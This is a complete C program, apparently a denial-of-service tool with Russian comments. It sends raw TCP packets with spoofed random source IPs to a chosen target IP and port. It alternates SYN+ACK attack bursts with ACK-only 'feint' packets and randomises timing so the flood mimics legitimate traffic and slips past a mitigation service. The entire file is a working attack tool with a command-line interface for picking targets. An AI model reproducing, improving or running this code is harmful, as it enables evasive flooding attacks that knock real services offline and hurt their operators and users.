#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>

// random number generator
static uint32_t x, y, z, w;

void rand_init(void) {
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

// checksum functions
uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf;
        buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *((uint8_t *) buf);
    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;
    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ((uint16_t) (~sum));
}

// low-rate bypass - обходит rs media с низкой интенсивностью
void lowrate_bypass(uint32_t target_ip, uint16_t dport, int duration) {
    int fd;
    char *pkt = malloc(128);
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    struct sockaddr_in sin;
    
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        perror("socket");
        return;
    }
    
    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) == -1) {
        perror("setsockopt");
        close(fd);
        return;
    }
    
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;
    sin.sin_port = htons(dport);
    
    printf("low-rate bypass attack on %s:%d for %d seconds\n", 
           inet_ntoa(*(struct in_addr*)&target_ip), dport, duration);
    
    time_t start_time = time(NULL);
    int packet_count = 0;
    int phase = 0; // 0 = feint, 1 = attack
    
    while (time(NULL) - start_time < duration) {
        // чередуем фазы: ложные запросы и реальные атаки
        if (packet_count % 100 == 0) {
            phase = !phase;
            printf("switching to %s phase\n", phase ? "attack" : "feint");
        }
        
        if (phase) {
            // фаза атаки - отправляем пакеты
            for (int i = 0; i < 5; i++) {
                // ip header
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = 0;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = rand_next() & 0xffff;
                iph->ttl = 64;
                iph->frag_off = htons(1 << 14);
                iph->protocol = IPPROTO_TCP;
                iph->saddr = rand_next();
                iph->daddr = target_ip;
                
                // tcp header
                tcph->source = rand_next() & 0xffff;
                tcph->dest = htons(dport);
                tcph->seq = rand_next();
                tcph->ack_seq = rand_next();
                tcph->doff = 5;
                tcph->syn = 1;
                tcph->ack = 1;
                tcph->window = htons(65535);
                
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                
                sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, 
                       (struct sockaddr *)&sin, sizeof(sin));
            }
        } else {
            // фаза ложных запросов - отправляем легитимные пакеты
            iph->version = 4;
            iph->ihl = 5;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = rand_next() & 0xffff;
            iph->ttl = 64;
            iph->frag_off = 0;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = rand_next();
            iph->daddr = target_ip;
            
            tcph->source = rand_next() & 0xffff;
            tcph->dest = htons(dport);
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->doff = 5;
            tcph->syn = 0;
            tcph->ack = 1;
            tcph->window = htons(65535);
            
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
            
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, 
                   (struct sockaddr *)&sin, sizeof(sin));
        }
        
        packet_count++;
        
        // случайная задержка для имитации легитимного трафика
        usleep(10000 + (rand_next() % 50000)); // 10-60ms
    }
    
    close(fd);
    free(pkt);
    printf("low-rate bypass finished\n");
}

void usage(void) {
    printf("usage: lowrate_bypass -i <target_ip> -p <target_port> -d <seconds>\n");
    printf("purpose: bypasses rs media with low-rate feint-based attacks\n");
    printf("example: lowrate_bypass -i 192.168.1.1 -p 80 -d 60\n");
}

int main(int argc, char *argv[]) {
    uint32_t target_ip = 0;
    uint16_t port = 0;
    int duration = 0;
    int opt;
    
    if (argc != 7) {
        usage();
        return 1;
    }
    
    while ((opt = getopt(argc, argv, "i:p:d:")) != -1) {
        switch (opt) {
            case 'i':
                target_ip = inet_addr(optarg);
                if (target_ip == INADDR_NONE) {
                    printf("invalid ip address: %s\n", optarg);
                    return 1;
                }
                break;
            case 'p':
                port = atoi(optarg);
                if (port == 0) {
                    printf("invalid port: %s\n", optarg);
                    return 1;
                }
                break;
            case 'd':
                duration = atoi(optarg);
                if (duration <= 0) {
                    printf("invalid duration: %s\n", optarg);
                    return 1;
                }
                break;
            default:
                usage();
                return 1;
        }
    }
    
    if (target_ip == 0 || port == 0 || duration == 0) {
        usage();
        return 1;
    }
    
    if (getuid() != 0) {
        printf("error: must run as root for raw sockets\n");
        return 1;
    }
    
    rand_init();
    lowrate_bypass(target_ip, port, duration);
    
    return 0;
}
